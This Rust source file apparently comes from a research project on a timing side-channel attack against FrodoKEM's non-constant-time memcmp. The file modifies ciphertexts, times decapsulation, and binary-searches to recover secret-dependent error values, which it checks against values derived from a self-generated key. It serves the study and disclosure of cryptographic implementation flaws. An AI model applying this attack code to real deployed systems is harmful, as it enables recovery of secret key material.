use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::save_to_csv;
use crate::utils::Rec;
use crate::utils::Recorder;
use crate::utils::SaveAllRecorder;
use liboqs_rs_bindings as oqs;
use log::{debug, error, info, trace, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::path::PathBuf;

enum SearchError {
    Internal(String),
    RetryIndex,
    RetryMod,
}

impl<S: ToString> From<S> for SearchError {
    fn from(s: S) -> SearchError {
        SearchError::Internal(s.to_string())
    }
}

#[derive(Debug)]
struct Threshold {
    pub goodhighrange: std::ops::Range<u64>,
    pub goodlowrange: std::ops::Range<u64>,
    pub midpoint: u64,
}

#[derive(Debug)]
enum ModCase {
    TooLowMod,
    TooHighMod,
}

impl Threshold {
    fn distinguish(&self, time: u64) -> Result<ModCase, SearchError> {
        match (
            self.goodlowrange.contains(&time),
            self.goodhighrange.contains(&time),
        ) {
            (false, false) => {
                error!("time {} outside of expected ranges: {:?}", time, self);
                Err(SearchError::RetryMod)
            }
            (true, false) => Ok(ModCase::TooHighMod),
            (false, true) => Ok(ModCase::TooLowMod),
            _ => Err(SearchError::Internal(
                "time value inside both ranges at the same time, impossible!".to_string(),
            )),
        }
    }
}

#[derive(Debug)]
struct SearchState {
    pub maxmod: u16,
    pub index_ij: usize,
    pub maxindex: usize,
    pub highlim: u16,
    pub lowlim: u16,
    pub highmodtime: Option<u64>,
    pub threshold: Option<Threshold>,
    pub iterations_binsearch: u64,
    pub iterations: u64,
    pub iterations_profiling: u64,
    pub low_moved: bool,
    pub high_moved: bool,
}

impl SearchState {
    fn calc_midpoint(&self) -> u16 {
        match (self.low_moved, self.high_moved) {
            (true, false) => {
                // the higher boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the low boundary.
                let d = self.highlim - self.lowlim;
                let new = self.lowlim + d / 8;
                debug!(
                    "Skewing the binsearch downwards, {} + ({} - {}) / 8 = {}",
                    self.lowlim, self.highlim, self.lowlim, new
                );
                std::cmp::max(self.lowlim + 1, new)
            }
            (false, true) => {
                // the self.lowerlim boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the self.highlim boundary.
                let d = self.highlim - self.lowlim;
                let new = self.highlim - d / 8;
                debug!(
                    "Skewing the binsearch uwards, {} - ({} - {}) / 8 = {}",
                    self.highlim, self.highlim, self.lowlim, new
                );
                std::cmp::min(self.highlim - 1, new)
            }
            _ => {
                // Both boundaries have now moved, we continue with normal binary search.
                (self.highlim + self.lowlim) / 2
            }
        }
    }

    fn update_state(&mut self, time: u64, currentmod: u16) -> Result<Option<u16>, SearchError> {
        if let Some(threshold) = &self.threshold {
            // Compare results to threshold
            match threshold.distinguish(time)? {
                ModCase::TooLowMod => {
                    debug!(
                        "C[{}/{}] => +Raising lowerbound to {}",
                        self.index_ij, self.maxindex, currentmod
                    );
                    self.lowlim = currentmod;
                    self.low_moved = true;
                }
                ModCase::TooHighMod => {
                    debug!(
                        "C[{}/{}] => -Lowering upperbound to {}",
                        self.index_ij, self.maxindex, currentmod
                    );
                    self.highlim = currentmod;
                    self.high_moved = true;
                }
            }
        } else if let Some(threshold_low) = self.highmodtime {
            // Threshold not yet calculated, do it!
            info!(
                "C[{}/{}] => Mean of low amount of modifications: {}",
                self.index_ij, self.maxindex, time
            );
            if time <= threshold_low {
                error!(
                    "threshold high ({}) <= threshold low ({})",
                    time, threshold_low
                );
                return Err(SearchError::RetryIndex);
            }

            let diff = time - threshold_low;
            let halfdiff = diff / 2;
            let threshold = Threshold {
                midpoint: threshold_low + halfdiff,
                goodlowrange: (threshold_low.saturating_sub(halfdiff))
                    ..(threshold_low + (halfdiff / 2)),
                goodhighrange: (time - (halfdiff / 2))..(time + halfdiff),
            };
            info!("New threshold is: {:?} (diff: {})", threshold, diff);
            self.threshold.replace(threshold);
            self.highlim = self.maxmod;
            self.lowlim = 0;
            self.iterations = self.iterations_binsearch;
        } else {
            // Record current datapoint, we need it later (see above) to calculate the thresold
            info!(
                "C[{}/{}] => Mean of high amount of modifications: {}",
                self.index_ij, self.maxindex, time
            );
            self.highmodtime.replace(time);
            self.highlim = 2; // This ensures we try 1 as the second trial
            self.lowlim = 0; // This ensures we try 1 as the second trial
        }
        if self.highlim - self.lowlim == 1 {
            if self.highlim == self.maxmod {
                error!("Upper bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            if self.lowlim == 0 {
                error!("Lower bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            return Ok(Some(self.lowlim));
        }

        Ok(None)
    }
}

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: u64,
    profileiters: u64,
    measure_source: &MeasureSource,
    cutoff: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
    expected_x0: u16,
    save_to_file: Option<&PathBuf>,
    recorders: &mut Vec<Recorder<SaveAllRecorder>>,
) -> Result<u16, SearchError> {
    let maxmod = error_correction_limit::<FRODO>() * 2;
    let mut state = SearchState {
        maxmod,
        index_ij,
        maxindex: FRODO::C::len() - 1,
        highlim: maxmod + 2, // This ensures that we try maxmod-1 first
        lowlim: maxmod - 3,  // This ensures that we try maxmod-1 first
        highmodtime: None,
        threshold: None,
        iterations: profileiters,
        iterations_binsearch: iterations,
        iterations_profiling: profileiters,
        low_moved: false,
        high_moved: false,
    };
    let mut retries = 0;
    let found = loop {
        // Select midpoint to test
        let currentmod: u16 = state.calc_midpoint();
        trace!("high: {}, low: {}", state.highlim, state.lowlim);

        // Measure
        debug!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            state.iterations
        );
        let rec = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            state.iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            Recorder::saveall(
                format!("BINSEARCH[{}]({}){{{}}}", index_ij, expected_x0, currentmod),
                Some(cutoff),
            ),
        )?;

        // Compute a single representative datapoint
        let time = rec.aggregated_value().map_err(|err| {
            error!("{}", err);
            SearchError::RetryIndex
        })?;
        debug!("time measurment is {}", time);

        // Save measurments to file?
        if let Some(path) = save_to_file {
            recorders.push(rec);
            debug!("Saving measurments to file {:?}", path);
            save_to_csv(&path, &recorders)?;
        }

        // Threshold handling

        match state.update_state(time, currentmod) {
            Ok(Some(value)) => {
                break value;
            }
            Ok(None) => {
                retries = 0;
            }
            Err(SearchError::RetryMod) => {
                warn!("Retrying the same modification again!");
                retries += 1;
                if retries >= 3 {
                    // We got too many bad results, we need to search for a new profile
                    return Err(SearchError::RetryIndex);
                }
            }
            Err(err) => return Err(err),
        }
    };

    Ok(found as u16)
}

//#[logfn_inputs(Trace)]
pub fn crack_s<FRODO: FrodoKem>(
    warmup: u64,
    iterations: u64,
    profileiters: u64,
    measure_source: MeasureSource,
    save_to_file: Option<PathBuf>,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    info!(
        "Launching the crack_s routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );

    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();

    //let n = FRODO::params().PARAM_N;
    let nbar: usize = FRODO::params().PARAM_NBAR;
    let mbar = nbar;
    let err_corr_limit = error_correction_limit::<FRODO>();
    let nbr_encaps = 1;
    let i = mbar - 1;

    let mut recorders = vec![];

    measure_source.prep_thread()?;

    for t in 0..nbr_encaps {
        info!("Using encaps to generate ciphertext number: {}", t);
        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
        let expectedEppp = expectedEppp.as_slice();

        for j in 0..nbar {
            // Modify ciphertext at C[nbar-1, j]
            let index = i * nbar + j;
            let expected_x0 = (err_corr_limit - expectedEppp[index]) as u16;

            let x0 = loop {
                info!(
                    "Starting {} warmup iterations without modifications in order to detect a good cutoff value", warmup
                );
                let cutoff = {
                    let rec = mod_measure::<FRODO, _>(
                        0,
                        index,
                        warmup,
                        &measure_source,
                        &mut ciphertext,
                        &mut shared_secret_d,
                        &mut secret_key,
                        Recorder::saveall("WARMUP", None),
                    )?;
                    let mean = rec.aggregated_value()?;
                    let minimum_value = rec.min()?;
                    let cutoff = mean + (mean - minimum_value);
                    info!(
                    "PROFILING ==> using {} as the cutoff value to remove outliers (minimum warmup latency: {}, mean: {}).",
                    cutoff, minimum_value, mean
                );
                    cutoff
                };

                info!(
                    "Starting binary search for Eppp[{},{}], expect to find x0 = {}",
                    i, j, expected_x0
                );
                match search_modification::<FRODO>(
                    index,
                    iterations,
                    profileiters,
                    &measure_source,
                    cutoff,
                    &mut ciphertext,
                    &mut shared_secret_d,
                    &mut secret_key,
                    expected_x0,
                    save_to_file.as_ref(),
                    &mut recorders,
                ) {
                    Ok(x0) => break x0,
                    Err(SearchError::Internal(err)) => return Err(err),
                    Err(_) => {
                        //RetryIndex and RetryMod
                        warn!("Retrying the search since we didn't get any results.");
                    }
                }
            };

            let Eppp_ij = err_corr_limit - x0;
            if Eppp_ij - 1 != expectedEppp[index] {
                warn!(
                    "Found -Eppp[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                )
            } else {
                info!(
                    "Found -Eppp[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                );
            }
        }
    }

    Ok(())
}
